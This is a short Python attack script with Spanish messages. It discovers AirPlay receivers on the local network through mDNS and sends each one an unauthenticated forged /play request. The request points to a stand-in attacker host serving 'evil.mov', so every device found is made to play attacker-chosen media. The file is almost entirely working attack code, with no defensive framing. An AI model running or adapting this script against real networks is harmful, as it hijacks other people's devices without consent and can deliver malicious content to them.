import socket
import sys

def discover_airplay_devices():
    # Descubrimiento mDNS (Bonjour) de dispositivos AirPlay en red local
    try:
        import zeroconf
    except ImportError:
        print("Instala zeroconf: pip install zeroconf")
        sys.exit(1)

    from zeroconf import Zeroconf, ServiceBrowser

    class AirPlayListener:
        def __init__(self):
            self.devices = []

        def add_service(self, zeroconf, type, name):
            info = zeroconf.get_service_info(type, name)
            if info:
                ip = socket.inet_ntoa(info.addresses[0])
                port = info.port
                self.devices.append((ip, port))

    zeroconf = Zeroconf()
    listener = AirPlayListener()
    browser = ServiceBrowser(zeroconf, "_airplay._tcp.local.", listener)

    import time
    time.sleep(3)
    zeroconf.close()
    return listener.devices

def send_fake_airplay_request(ip, port):
    request = (
        "POST /play HTTP/1.1\r\n"
        f"Host: {ip}:{port}\r\n"
        "User-Agent: AirPlay/540.31\r\n"
        "Content-Type: text/parameters\r\n"
        "Content-Length: 55\r\n"
        "\r\n"
        "Content-Location: http://attacker.local/evil.mov\nStart-Position: 0\n"
    )

    print(f"[+] Enviando petici√≥n falsa a {ip}:{port} ...")
    try:
        s = socket.create_connection((ip, port), timeout=5)
        s.sendall(request.encode())
        response = s.recv(1024)
        print(f"[+] Respuesta: {response.decode(errors='ignore')}")
        s.close()
    except Exception as e:
        print(f"[-] Error al conectar: {e}")

if __name__ == "__main__":
    devices = discover_airplay_devices()
    if not devices:
        print("[-] No se encontraron dispositivos AirPlay.")
        sys.exit(1)

    for ip, port in devices:
        send_fake_airplay_request(ip, port)